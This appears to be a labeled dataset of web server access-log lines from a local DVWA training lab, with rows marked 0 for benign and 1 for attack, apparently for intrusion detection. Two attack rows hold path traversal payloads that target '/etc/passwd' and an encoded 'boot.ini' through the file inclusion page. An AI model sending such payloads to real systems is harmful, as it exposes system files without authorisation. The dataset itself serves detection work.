81,"127.0.0.1 - - [28/Apr/2021:21:53:22 -0400] ""GET /DVWA/dvwa/images/spanner.png HTTP/1.1"" 304 180 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
96,"127.0.0.1 - - [28/Apr/2021:22:15:24 -0400] ""GET /DVWA//dvwa/js/add_event_listeners.js HTTP/1.1"" 200 626 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=a"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
179,"127.0.0.1 - - [28/Apr/2021:21:53:23 -0400] ""GET /DVWA/setup.php HTTP/1.1"" 200 2135 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
95,"127.0.0.1 - - [28/Apr/2021:21:54:08 -0400] ""GET /DVWA/index.php HTTP/1.1"" 200 2877 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
65,"127.0.0.1 - - [28/Apr/2021:21:44:08 -0400] ""GET /DVWA/dvwa/images/spanner.png HTTP/1.1"" 304 180 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11,"127.0.0.1 - - [28/Apr/2021:22:31:36 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e% 25%5c%2e%2e%25%5c%2e%2e%255cboot%2eini"" 400 0 ""-"" ""-""",1
77,"127.0.0.1 - - [28/Apr/2021:22:51:20 -0400] ""GET /DVWA/vulnerabilities/xss_s/ HTTP/1.1"" 200 1870 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=alan"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
221,"127.0.0.1 - - [28/Apr/2021:22:11:37 -0400] ""GET /DVWA/vulnerabilities/csrf/ HTTP/1.1"" 200 1919 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
104,"127.0.0.1 - - [28/Apr/2021:22:50:57 -0400] ""GET /DVWA/vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1"" 200 1662 ""http://127.0.0.1/DVWA/vulnerabilities/sqli/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
83,"127.0.0.1 - - [28/Apr/2021:21:49:04 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1446 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
76,"127.0.0.1 - - [28/Apr/2021:22:51:42 -0400] ""GET /DVWA/vulnerabilities/javascript/ HTTP/1.1"" 200 3513 ""http://127.0.0.1/DVWA/vulnerabilities/xss_s/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15,"127.0.0.1 - - [28/Apr/2021:21:41:37 -0400] ""GET /DVWA/favicon.ico HTTP/1.1"" 200 1706 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
39,"127.0.0.1 - - [28/Apr/2021:22:11:58 -0400] ""GET /DVWA/vulnerabilities/fi/?page=../../../etc/passwd HTTP/1.1"" 200 336 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
